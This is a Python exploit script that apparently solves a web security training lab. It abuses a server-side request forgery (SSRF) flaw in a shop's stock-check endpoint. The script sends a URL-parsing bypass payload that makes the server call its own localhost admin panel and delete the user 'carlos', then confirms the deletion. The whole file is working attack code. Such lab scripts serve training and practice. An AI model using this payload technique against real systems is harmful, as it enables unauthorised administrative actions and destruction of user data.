import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def delete_user(url):
    delete_user_url_ssrf_payload = "http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos"
    check_stock_path = '/product/stock'
    data = {
        "stockApi": delete_user_url_ssrf_payload
    }
    requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)

    # Check if user was deleted successfully
    admin_ssrf_payload = "http://localhost%23@stock.weliketoshop.net/admin"
    data2 = {
        "stockApi": admin_ssrf_payload
    }
    r = requests.post(url + check_stock_path, data=data2, verify=False, proxies=proxies)
    if "carlos" not in r.text:
        print("(+) User carlos deleted successfully!")
    else:
        print("(-) Failed to delete user carlos.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting user carlos...")
    delete_user(url)

if __name__ == "__main__":
    main()